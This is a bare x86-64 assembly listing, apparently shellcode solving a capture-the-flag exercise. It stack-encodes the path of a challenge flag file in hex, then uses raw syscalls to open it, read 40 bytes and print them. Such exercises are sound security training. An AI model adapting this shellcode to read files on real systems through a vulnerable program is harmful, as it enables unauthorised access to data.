section .text
global _start
_start:
    push 0x0
    mov rax, 0x676e6f6f6f6f6f6f
    push rax
    mov rax, 0x6c5f73695f656d61
    push rax
    mov rax, 0x6e5f67616c662f63
    push rax
    mov rax, 0x697361625f6c6c65
    push rax
    mov rax, 0x68732f656d6f682f
    push rax

_open:
    lea rdi, [rsp]
    mov rsi, 0
    mov rax, 2
    syscall


_read:
    mov rdi, rax
    lea rsi, [rsp]
    mov rdx, 40
    mov rax, 0
    syscall

_write:
    mov rdi, 1
    mov rax, 1
    syscall

_exit:
    mov rdi,0
    mov rax, 60
    syscall